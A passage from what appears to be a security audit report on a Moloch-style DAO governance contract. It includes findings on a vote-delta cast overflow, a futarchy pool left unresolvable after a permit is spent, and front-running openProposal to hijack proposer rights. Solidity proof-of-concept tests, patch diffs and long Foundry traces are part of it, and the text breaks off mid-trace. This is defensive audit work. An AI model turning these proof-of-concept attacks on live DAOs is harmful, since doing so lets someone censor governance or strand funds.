    │   │   │   │   │   │   │   ├─ [692] Shares::balanceOf(0x0000000000000000000000000000000000C0FFEE) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 50
    │   │   │   │   │   │   │   └─ ← [Return] 50
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000C0FFEE, id: 3)
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   └─ ← [Return]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [9028] → new <unknown>@0x6D0171f9EEAd0c07B484b480d1fE3392C1954c5e
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [22728] 0x6D0171f9EEAd0c07B484b480d1fE3392C1954c5e::init()
    │   │   ├─ [22573] Loot::init() [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [24098] Moloch::setProposalTTL(864000 [8.64e5])
    │   │   └─ ← [Return]
    │   ├─ [993] Moloch::setTimelockDelay(259200 [2.592e5])
    │   │   └─ ← [Return]
    │   └─ ← [Return]
    ├─ [0] VM::roll(2)
    │   └─ ← [Return]
    ├─ [0] VM::deal(MolochTimelockEarlyStartTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2000000000000000000 [2e18])
    │   └─ ← [Return]
    ├─ [62] Moloch::receive{value: 1000000000000000000}()
    │   └─ ← [Stop]
    ├─ [4371] Moloch::proposalId(0, 0x00000000000000000000000000000000000A11cE, 1000000000000000000 [1e18], 0x, 0x63509ac67f777d683401bafa153adc8c94a16454fe266641f9bcb8a73ac6c734) [staticcall]
    │   └─ ← [Return] 19931919140058357268520590907091504754993079095882688910415432667599906511097 [1.993e76]
    ├─ [0] VM::prank(0x00000000000000000000000000000000000A11cE)
    │   └─ ← [Return]
    ├─ [313096] Moloch::castVote(19931919140058357268520590907091504754993079095882688910415432667599906511097 [1.993e76], 1)
    │   ├─ [1409] 0x7d7048Cd3e0a5a4e35C736A53a4bB9812fdfC6dC::getPastTotalSupply(1) [staticcall]
    │   │   ├─ [1245] Shares::getPastTotalSupply(1) [delegatecall]
    │   │   │   └─ ← [Return] 120
    │   │   └─ ← [Return] 120
    │   ├─ emit Opened(id: 19931919140058357268520590907091504754993079095882688910415432667599906511097 [1.993e76], snapshotBlock: 1, supplyAtSnapshot: 120)
    │   ├─ [1424] 0x7d7048Cd3e0a5a4e35C736A53a4bB9812fdfC6dC::getPastVotes(0x00000000000000000000000000000000000A11cE, 1) [staticcall]
    │   │   ├─ [1254] Shares::getPastVotes(0x00000000000000000000000000000000000A11cE, 1) [delegatecall]
    │   │   │   └─ ← [Return] 40
    │   │   └─ ← [Return] 40
    │   ├─ emit Transfer(caller: 0x00000000000000000000000000000000000A11cE, from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000A11cE, id: 19270551472636957050621792132287909728253242383207274501336484695499770102273 [1.927e76], amount: 40)
    │   ├─ emit Voted(id: 19931919140058357268520590907091504754993079095882688910415432667599906511097 [1.993e76], voter: 0x00000000000000000000000000000000000A11cE, support: 1, weight: 40)
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x00000000000000000000000000000000000A11cE)
    │   └─ ← [Return]
    ├─ [27699] Moloch::queue(19931919140058357268520590907091504754993079095882688910415432667599906511097 [1.993e76])
    │   ├─ emit Queued(id: 19931919140058357268520590907091504754993079095882688910415432667599906511097 [1.993e76], when: 1)
    │   └─ ← [Return]
    ├─ [1393] Moloch::queuedAt(19931919140058357268520590907091504754993079095882688910415432667599906511097 [1.993e76]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [1019] Moloch::createdAt(19931919140058357268520590907091504754993079095882688910415432667599906511097 [1.993e76]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertLt(1, 864001 [8.64e5], "queued before TTL ends") [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::warp(86401 [8.64e4])
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x0000000000000000000000000000000000C0FFEE)
    │   └─ ← [Return]
    ├─ [1343] Moloch::castVote(19931919140058357268520590907091504754993079095882688910415432667599906511097 [1.993e76], 0)
    │   └─ ← [Revert] NotOk()
    └─ ← [Revert] NotOk()

Backtrace:
  at Moloch.castVote
  at MolochTimelockEarlyStartTest.testTimelockStartsBeforeVoteFinalization

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.84ms (1.91ms CPU time)

Ran 1 test suite in 30.62ms (2.84ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/MolochHarness.t.sol:MolochTimelockEarlyStartTest
[FAIL: NotOk()] testTimelockStartsBeforeVoteFinalization() (gas: 8547399)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test
```

---

# Vote delta overflows on large transfers
**#18**
- Severity: Critical
- Validity: Invalid

## Targets
- _moveTokens (Shares)

## Affected Locations
- **Shares._moveTokens**: Single finding location

## Description

The function converts the `uint256 amount` into an `int256` and uses that value to update voting power via `_afterVotingBalanceChange`. Solidity does not check this cast, so any value greater than `type(int256).max` wraps into a negative number. When that happens, the deltas sent to `_afterVotingBalanceChange` no longer reflect the actual token movement and can even revert when negating `int256.min`. This results in voting checkpoints being updated in the wrong direction or transfers failing for very large amounts. Because there is no explicit cap on balances or transfer amounts, the contract has no protection against this overflow scenario.

## Root cause

`amount` is cast from `uint256` to `int256` without enforcing `amount <= type(int256).max` or constraining total supply to fit within the signed range.

## Impact

If balances ever exceed `2^255-1`, a holder can transfer a high-bit amount and retain or increase their voting power while the recipient loses votes. Transfers of exactly `2^255` will revert, which can permanently block legitimate large transfers if such balances exist.

## Remediation

**Status:** Incomplete

### Explanation

Add an explicit bound check (e.g., via SafeCast) before casting `amount` to `int256`, and enforce that total supply and balances can never exceed `type(int256).max` so vote deltas remain representable. This prevents overflow and ensures large transfers cannot corrupt or block vote accounting.

---

# Permit execution leaves futarchy unresolvable
**#8**
- Severity: High
- Validity: Not a bug
> **Review: Very low likelihood.** Requires a permit and proposal to share the same intent ID, which means someone deliberately opens a proposal with exact same parameters as a spent permit. UI can prevent this. Futarchy-enabled DAOs will use more sophisticated tooling. Note for v2 hardening.

## Targets
- spendPermit (Moloch)

## Affected Locations
- **Moloch.spendPermit**: Single finding location

## Description

`spendPermit` marks an intent as executed and only resolves futarchy if it was already enabled at the time of execution. Because `openProposal` does not check `executed[id]`, anyone can later open a proposal for the same intent id and trigger auto‑futarchy initialization and pool funding after the permit has already been spent. Once `executed[id]` is true, `resolveFutarchyNo` is permanently blocked and there is no code path that can call `_resolveFutarchyYes` again. The futarchy entry therefore stays in an unresolved state forever, which makes `cashOutFutarchy` impossible for that id. This creates a griefing vector that can strand auto‑funded reward pools and break the futarchy incentive mechanism.

## Root cause

The futarchy lifecycle is not ordered: `openProposal` can initialize futarchy after an intent is already executed, while resolution only happens at execution time and cannot be triggered afterward.

## Impact

An attacker can open proposals for already executed permits to create futarchy pools that can never be resolved, preventing any payouts to receipt holders. If auto‑funding is enabled, this can strand reward allocations indefinitely and undermine the incentive system for that intent. The DAO may be forced to carry unresolved futarchy entries that cannot be cleared through normal flows.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/Moloch.sol";

contract MolochPermitFutarchyTest is Test {
    function testPermitExecutionLeavesFutarchyUnresolvable() public {
        address alice = makeAddr("alice");
        address spender = makeAddr("spender");
        address recipient = makeAddr("recipient");

        Moloch moloch = new Moloch();

        bytes memory data = "";
        bytes32 nonce = keccak256("nonce");

        Call[] memory initCalls = new Call[](2);
        initCalls[0] = Call({
            target: address(moloch),
            value: 0,
            data: abi.encodeCall(Moloch.setAutoFutarchy, (uint256(10_000), uint256(0)))
        });
        initCalls[1] = Call({
            target: address(moloch),
            value: 0,
            data: abi.encodeCall(
                Moloch.setPermit,
                (uint8(0), recipient, uint256(0), data, nonce, spender, uint256(1))
            )
        });

        address[] memory initHolders = new address[](1);
        initHolders[0] = alice;
        uint256[] memory initShares = new uint256[](1);
        initShares[0] = 100;

        moloch.init(
            "Org",
            "ORG",
            "",
            0,
            false,
            address(0),
            initHolders,
            initShares,
            initCalls
        );

        vm.roll(block.number + 1);

        vm.prank(spender);
        moloch.spendPermit(0, recipient, 0, data, nonce);

        uint256 id = moloch.proposalId(0, recipient, 0, data, nonce);

        // Proposal can still be opened after permit execution.
        moloch.openProposal(id);

        (
            bool enabled,
            ,
            uint256 pool,
            bool resolved,
            ,
            ,
        ) = moloch.futarchy(id);

        assertTrue(enabled, "futarchy should be enabled by auto-funding");
        assertGt(pool, 0, "auto-funding should have earmarked a pool");
        assertFalse(resolved, "futarchy should be unresolved");
        assertEq(uint256(moloch.state(id)), uint256(Moloch.ProposalState.Executed));

        // Expected: defeated/expired proposals should allow NO-side resolution.
        // Actual: executed[id] is already true, so this reverts and futarchy is stuck.
        moloch.resolveFutarchyNo(id);
    }
}
```

## Remediation

**Status:** Complete

### Explanation

Add an `executed` guard to `openProposal` so proposals for already executed intents cannot initialize futarchy pools after the permit has been spent.

### Patch

```diff
diff --git a/src/Moloch.sol b/src/Moloch.sol
--- a/src/Moloch.sol
+++ b/src/Moloch.sol
@@ -277,6 +277,7 @@
     /// ensuring Majeur ERC20Votes-style checkpoints can be queried safely:
     function openProposal(uint256 id) public {
         if (snapshotBlock[id] != 0) return;
+        if (executed[id]) revert AlreadyExecuted();
 
         Shares _shares = shares;
```

### Affected Files

- `src/Moloch.sol`

### Validation Output

```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 11.88s
Compiler run successful!

Ran 1 test for test/MolochHarness.t.sol:MolochPermitFutarchyTest
[FAIL: AlreadyExecuted()] testPermitExecutionLeavesFutarchyUnresolvable() (gas: 7965878)
Traces:
  [7965878] MolochPermitFutarchyTest::testPermitExecutionLeavesFutarchyUnresolvable()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]
    ├─ [0] VM::label(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6], "alice")
    │   └─ ← [Return]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] spender: [0xF8AE1707Cc40150B0bfF8CB09552B833Dbf13E3f]
    ├─ [0] VM::label(spender: [0xF8AE1707Cc40150B0bfF8CB09552B833Dbf13E3f], "spender")
    │   └─ ← [Return]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5]
    ├─ [0] VM::label(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], "recipient")
    │   └─ ← [Return]
    ├─ [7147249] → new Moloch@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   ├─ [1560426] → new Shares@0x7007dA0C6A68FAAd83f2507E1A8a8BcB8d0d0985
    │   │   └─ ← [Return] 7794 bytes of code
    │   ├─ [866296] → new Badges@0xcd3a31B13c8D1419E6e6F4D0AA6E940634460CE8
    │   │   └─ ← [Return] 4327 bytes of code
    │   ├─ [405435] → new Loot@0x63Cf7fF51460ecFA71d4Cc18E594301270fBb9D4
    │   │   └─ ← [Return] 2025 bytes of code
    │   └─ ← [Return] 21044 bytes of code
    ├─ [719554] Moloch::init("Org", "ORG", "", 0, false, 0x0000000000000000000000000000000000000000, [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6], [100], [Call({ target: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, value: 0, data: 0x92a023a900000000000000000000000000000000000000000000000000000000000027100000000000000000000000000000000000000000000000000000000000000000 }), Call({ target: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, value: 0, data: 0x12374b040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006217c47ffa5eb3f3c92247fffe22ad998242c5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e07ab1577440dd7bedf920cb6de2f9fc6bf7ba98c78c85a3fa1f8311aac95e1759000000000000000000000000f8ae1707cc40150b0bff8cb09552b833dbf13e3f00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000 })])
    │   ├─ [9028] → new <unknown>@0x37da14228290cb649486aE05342d3EB5443617BD
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [22716] 0x37da14228290cb649486aE05342d3EB5443617BD::init()
    │   │   ├─ [22561] Badges::init() [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [9028] → new <unknown>@0x6f8f8DFCaEF05351865ce64D35892d53ef9cE6d4
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [333625] 0x6f8f8DFCaEF05351865ce64D35892d53ef9cE6d4::init([0x328809Bc894f92807417D2dAD6b7C998c1aFdac6], [100])
    │   │   ├─ [333434] Shares::init([0x328809Bc894f92807417D2dAD6b7C998c1aFdac6], [100]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6], amount: 100)
    │   │   │   ├─ emit DelegateChanged(delegator: alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6], fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6])
    │   │   │   ├─ emit DelegateVotesChanged(delegate: alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6], previousBalance: 0, newBalance: 100)
    │   │   │   ├─ [141065] Moloch::onSharesChanged(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6])
    │   │   │   │   ├─ [139024] 0x37da14228290cb649486aE05342d3EB5443617BD::onSharesChanged(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6])
    │   │   │   │   │   ├─ [138863] Badges::onSharesChanged(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) [delegatecall]
    │   │   │   │   │   │   ├─ [312] Moloch::shares() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x6f8f8DFCaEF05351865ce64D35892d53ef9cE6d4
    │   │   │   │   │   │   ├─ [856] 0x6f8f8DFCaEF05351865ce64D35892d53ef9cE6d4::balanceOf(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) [staticcall]
    │   │   │   │   │   │   │   ├─ [692] Shares::balanceOf(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 100
    │   │   │   │   │   │   │   └─ ← [Return] 100
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6], id: 1)
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   └─ ← [Return]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [9028] → new <unknown>@0x59823f118005b98eDAffD4f008878A11699f5D74
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [22728] 0x59823f118005b98eDAffD4f008878A11699f5D74::init()
    │   │   ├─ [22573] Loot::init() [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [25497] Moloch::setAutoFutarchy(10000 [1e4], 0)
    │   │   └─ ← [Return]
    │   ├─ [74860] Moloch::setPermit(0, recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], 0, 0x, 0x7ab1577440dd7bedf920cb6de2f9fc6bf7ba98c78c85a3fa1f8311aac95e1759, spender: [0xF8AE1707Cc40150B0bfF8CB09552B833Dbf13E3f], 1)
    │   │   ├─ emit Transfer(caller: Moloch: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], from: 0x0000000000000000000000000000000000000000, to: spender: [0xF8AE1707Cc40150B0bfF8CB09552B833Dbf13E3f], id: 82814142735619790431505868334215817812688706000409734089212339463414144128339 [8.281e76], amount: 1)
    │   │   ├─ emit PermitSet(spender: spender: [0xF8AE1707Cc40150B0bfF8CB09552B833Dbf13E3f], id: 82814142735619790431505868334215817812688706000409734089212339463414144128339 [8.281e76], newCount: 1)
    │   │   └─ ← [Return]
    │   └─ ← [Return]
    ├─ [0] VM::roll(2)
    │   └─ ← [Return]
    ├─ [0] VM::prank(spender: [0xF8AE1707Cc40150B0bfF8CB09552B833Dbf13E3f])
    │   └─ ← [Return]
    ├─ [35865] Moloch::spendPermit(0, recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], 0, 0x, 0x7ab1577440dd7bedf920cb6de2f9fc6bf7ba98c78c85a3fa1f8311aac95e1759)
    │   ├─ emit Transfer(caller: spender: [0xF8AE1707Cc40150B0bfF8CB09552B833Dbf13E3f], from: spender: [0xF8AE1707Cc40150B0bfF8CB09552B833Dbf13E3f], to: 0x0000000000000000000000000000000000000000, id: 82814142735619790431505868334215817812688706000409734089212339463414144128339 [8.281e76], amount: 1)
    │   ├─ [0] recipient::fallback()
    │   │   └─ ← [Stop]
    │   ├─ emit PermitSpent(id: 82814142735619790431505868334215817812688706000409734089212339463414144128339 [8.281e76], by: spender: [0xF8AE1707Cc40150B0bfF8CB09552B833Dbf13E3f], op: 0, to: recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], value: 0)
    │   └─ ← [Return] true, 0x
    ├─ [2371] Moloch::proposalId(0, recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], 0, 0x, 0x7ab1577440dd7bedf920cb6de2f9fc6bf7ba98c78c85a3fa1f8311aac95e1759) [staticcall]
    │   └─ ← [Return] 82814142735619790431505868334215817812688706000409734089212339463414144128339 [8.281e76]
    ├─ [3017] Moloch::openProposal(82814142735619790431505868334215817812688706000409734089212339463414144128339 [8.281e76])
    │   └─ ← [Revert] AlreadyExecuted()
    └─ ← [Revert] AlreadyExecuted()

Backtrace:
  at Moloch.openProposal
  at MolochPermitFutarchyTest.testPermitExecutionLeavesFutarchyUnresolvable

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.43ms (1.68ms CPU time)

Ran 1 test suite in 31.98ms (2.43ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/MolochHarness.t.sol:MolochPermitFutarchyTest
[FAIL: AlreadyExecuted()] testPermitExecutionLeavesFutarchyUnresolvable() (gas: 7965878)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test
```

---

# Permissionless `openProposal` lets proposer hijack
**#10**
- Severity: High
- Validity: Not a bug
> **Review: Good hardening for v2, low practical risk.** `cancelProposal` has strong guards (requires `state == Active`, `queuedAt == 0`, zero votes), so a hijacker can only cancel proposals with no votes. Requiring nonzero voting power even when threshold is 0 is a reasonable future addition.

## Targets
- openProposal (Moloch)
- cancelProposal (Moloch)

## Affected Locations
- **Moloch.openProposal**: This function initializes `proposerOf[id]`, `createdAt`, and `supplySnapshot` for any caller-chosen `id` without verifying the proposal exists or that the caller is the rightful proposer; adding existence checks and binding `id` to the proposal’s recorded proposer (or restricting who can open) fixes the hijack.
- **Moloch.cancelProposal**: This function authorizes cancellation solely via `proposerOf[id]`, so once `openProposal` is hijacked it enables an attacker to mark the proposal executed/canceled and effectively burn or disable the proposal id, materializing the censorship impact.

## Description

`openProposal` is publicly callable and initializes proposal metadata (`createdAt`, `supplySnapshot`, `proposerOf`, and `snapshotBlock`) for any caller-supplied proposal id the first time it is invoked. It does not validate that the id corresponds to a previously submitted proposal, nor does it authenticate that `msg.sender` is the intended proposer for that id. Because the function returns early once `snapshotBlock[id]` is set, the first caller permanently “wins” and later legitimate attempts to open the proposal cannot correct the stored metadata. Downstream logic treats this metadata as authoritative for proposal state computation and for proposer-only actions. As a result, an attacker can pre-open or front-run predictable ids to seize proposer rights and lock in stale snapshots/timestamps that affect quorum and expiry behavior.

## Root cause

`openProposal` assigns proposer and snapshot metadata on a first-come-first-served basis for arbitrary ids without validating proposal existence or binding the id to an authorized proposer, and the `snapshotBlock` guard prevents later correction.

## Impact

An attacker can front-run proposal openings to become the recorded proposer and then censor governance by canceling proposals before any votes occur. By forcing an old `createdAt`/`supplySnapshot`, they can also induce premature expiry or manipulate quorum calculations, skewing outcomes and blocking treasury/control flows that depend on correct proposal state.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {Moloch, Summoner, Shares, Call} from "src/Moloch.sol";

contract Target {
    uint256 public value;

    function setValue(uint256 newValue) external {
        value = newValue;
    }
}

contract OpenProposalHijackTest is Test {
    Summoner internal summoner;
    Moloch internal moloch;
    Shares internal shares;
    Target internal target;

    address internal alice = address(0xA11CE);
    address internal bob = address(0xB0B);

    function setUp() public {
        summoner = new Summoner();

        address[] memory holders = new address[](1);
        holders[0] = alice;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100e18;

        moloch = summoner.summon(
            "Test DAO",
            "TEST",
            "",
            5000, // quorum BPS so a zero-vote proposal stays Active
            false,
            address(0),
            bytes32(0),
            holders,
            amounts,
            new Call[](0)
        );

        shares = moloch.shares();
        target = new Target();

        // Advance a block so snapshots can read the initial supply checkpoint.
        vm.roll(block.number + 1);
    }

    function test_OpenProposalHijackCensorsProposal() public {
        bytes memory data = abi.encodeWithSelector(Target.setValue.selector, 123);
        uint256 id = moloch.proposalId(0, address(target), 0, data, bytes32(0));

        // Bob front-runs and opens Alice's intended proposal, becoming the recorded proposer.
        vm.prank(bob);
        moloch.openProposal(id);
        assertEq(moloch.proposerOf(id), bob);

        // Alice tries to open the proposal herself but the metadata is already locked.
        vm.prank(alice);
        moloch.openProposal(id);

        // Bob can cancel immediately (no votes yet), permanently blocking the proposal.
        vm.prank(bob);
        moloch.cancelProposal(id);
        assertTrue(moloch.executed(id));

        // Alice can no longer vote or execute since the proposal is tombstoned.
        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSignature("AlreadyExecuted()"));
        moloch.castVote(id, 1);

        // Invariant: the proposal should have been bound to Alice, not a front-runner.
        assertEq(moloch.proposerOf(id), alice, "proposer hijacked by front-runner");
    }
}
```

## Remediation

**Status:** Complete

### Explanation

Require `openProposal` callers to have nonzero current voting power when `proposalThreshold` is zero by checking `proposerVotes`, preventing non-members from front-running proposal metadata and hijacking `proposerOf`.

### Patch

```diff
diff --git a/src/Moloch.sol b/src/Moloch.sol
--- a/src/Moloch.sol
+++ b/src/Moloch.sol
@@ -280,9 +280,12 @@
 
         Shares _shares = shares;
 
+        uint256 proposerVotes = _shares.getVotes(msg.sender);
         uint96 threshold = proposalThreshold;
         if (threshold != 0) {
-            require(_shares.getVotes(msg.sender) >= threshold, Unauthorized());
+            require(proposerVotes >= threshold, Unauthorized());
+        } else {
+            require(proposerVotes != 0, Unauthorized());
         }
 
         uint256 supply;
```

### Affected Files

- `src/Moloch.sol`

### Validation Output

```
Compiling 21 files with Solc 0.8.30
Solc 0.8.30 finished in 13.70s
Compiler run successful!

Ran 1 test for test/MolochHarness.t.sol:OpenProposalHijackTest
[FAIL: Unauthorized()] test_OpenProposalHijackCensorsProposal() (gas: 36272)
Traces:
  [8440150] OpenProposalHijackTest::setUp()
    ├─ [7523515] → new Summoner@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   ├─ [7146249] → new Moloch@0x09d898b93f4E6f34802FDc2f4505eb5a1de20907
    │   │   ├─ [1560426] → new Shares@0x6f1893d2cA2b39b8eE5293585a364265d2316B8D
    │   │   │   └─ ← [Return] 7794 bytes of code
    │   │   ├─ [866296] → new Badges@0x2576882a6AEa29b54df0126d7c84C1B3D84877B6
    │   │   │   └─ ← [Return] 4327 bytes of code
    │   │   ├─ [405435] → new Loot@0xFc8476Eb509D40AB70835435869010723f41d8DF
    │   │   │   └─ ← [Return] 2025 bytes of code
    │   │   └─ ← [Return] 21039 bytes of code
    │   ├─ emit NewDAO(summoner: Summoner: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], dao: Moloch: [0x09d898b93f4E6f34802FDc2f4505eb5a1de20907])
    │   └─ ← [Return] 1627 bytes of code
    ├─ [730943] Summoner::summon("Test DAO", "TEST", "", 5000, false, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000000000000000000000000000, [0x00000000000000000000000000000000000A11cE], [100000000000000000000 [1e20]], [])
    │   ├─ [9028] → new <unknown>@0x1d9e93D0A9E27BEBce5342828243526c3Ef8D13F
    │   │   └─ ← [Return] 45 bytes of code
    │   ├─ [640026] 0x1d9e93D0A9E27BEBce5342828243526c3Ef8D13F::init("Test DAO", "TEST", "", 5000, false, 0x0000000000000000000000000000000000000000, [0x00000000000000000000000000000000000A11cE], [100000000000000000000 [1e20]], [])
    │   │   ├─ [639757] Moloch::init("Test DAO", "TEST", "", 5000, false, 0x0000000000000000000000000000000000000000, [0x00000000000000000000000000000000000A11cE], [100000000000000000000 [1e20]], []) [delegatecall]
    │   │   │   ├─ [9028] → new <unknown>@0x15B1421848f5d121971618f0D349cA5E596329Ae
    │   │   │   │   └─ ← [Return] 45 bytes of code
    │   │   │   ├─ [22716] 0x15B1421848f5d121971618f0D349cA5E596329Ae::init()
    │   │   │   │   ├─ [22561] Badges::init() [delegatecall]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ [9028] → new <unknown>@0x4050D27825eC26E5628Be3d693D1D5f7099d9f66
    │   │   │   │   └─ ← [Return] 45 bytes of code
    │   │   │   ├─ [333944] 0x4050D27825eC26E5628Be3d693D1D5f7099d9f66::init([0x00000000000000000000000000000000000A11cE], [100000000000000000000 [1e20]])
    │   │   │   │   ├─ [333753] Shares::init([0x00000000000000000000000000000000000A11cE], [100000000000000000000 [1e20]]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000A11cE, amount: 100000000000000000000 [1e20])
    │   │   │   │   │   ├─ emit DelegateChanged(delegator: 0x00000000000000000000000000000000000A11cE, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x00000000000000000000000000000000000A11cE)
    │   │   │   │   │   ├─ emit DelegateVotesChanged(delegate: 0x00000000000000000000000000000000000A11cE, previousBalance: 0, newBalance: 100000000000000000000 [1e20])
    │   │   │   │   │   ├─ [141384] 0x1d9e93D0A9E27BEBce5342828243526c3Ef8D13F::onSharesChanged(0x00000000000000000000000000000000000A11cE)
    │   │   │   │   │   │   ├─ [141223] Moloch::onSharesChanged(0x00000000000000000000000000000000000A11cE) [delegatecall]
    │   │   │   │   │   │   │   ├─ [139182] 0x15B1421848f5d121971618f0D349cA5E596329Ae::onSharesChanged(0x00000000000000000000000000000000000A11cE)
    │   │   │   │   │   │   │   │   ├─ [139021] Badges::onSharesChanged(0x00000000000000000000000000000000000A11cE) [delegatecall]
    │   │   │   │   │   │   │   │   │   ├─ [470] 0x1d9e93D0A9E27BEBce5342828243526c3Ef8D13F::shares() [staticcall]
    │   │   │   │   │   │   │   │   │   │   ├─ [312] Moloch::shares() [delegatecall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x4050D27825eC26E5628Be3d693D1D5f7099d9f66
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x4050D27825eC26E5628Be3d693D1D5f7099d9f66
    │   │   │   │   │   │   │   │   │   ├─ [856] 0x4050D27825eC26E5628Be3d693D1D5f7099d9f66::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]
    │   │   │   │   │   │   │   │   │   │   ├─ [692] Shares::balanceOf(0x00000000000000000000000000000000000A11cE) [delegatecall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000A11cE, id: 1)
    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ [9028] → new <unknown>@0x9f41a8Ed8bc8a79Ca509F9edab2eBe45978268Fa
    │   │   │   │   └─ ← [Return] 45 bytes of code
    │   │   │   ├─ [22728] 0x9f41a8Ed8bc8a79Ca509F9edab2eBe45978268Fa::init()
    │   │   │   │   ├─ [22573] Loot::init() [delegatecall]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   └─ ← [Return]
    │   │   └─ ← [Return]
    │   ├─ emit NewDAO(summoner: OpenProposalHijackTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], dao: 0x1d9e93D0A9E27BEBce5342828243526c3Ef8D13F)
    │   └─ ← [Return] 0x1d9e93D0A9E27BEBce5342828243526c3Ef8D13F
    ├─ [470] 0x1d9e93D0A9E27BEBce5342828243526c3Ef8D13F::shares() [staticcall]
    │   ├─ [312] Moloch::shares() [delegatecall]
    │   │   └─ ← [Return] 0x4050D27825eC26E5628Be3d693D1D5f7099d9f66
    │   └─ ← [Return] 0x4050D27825eC26E5628Be3d693D1D5f7099d9f66
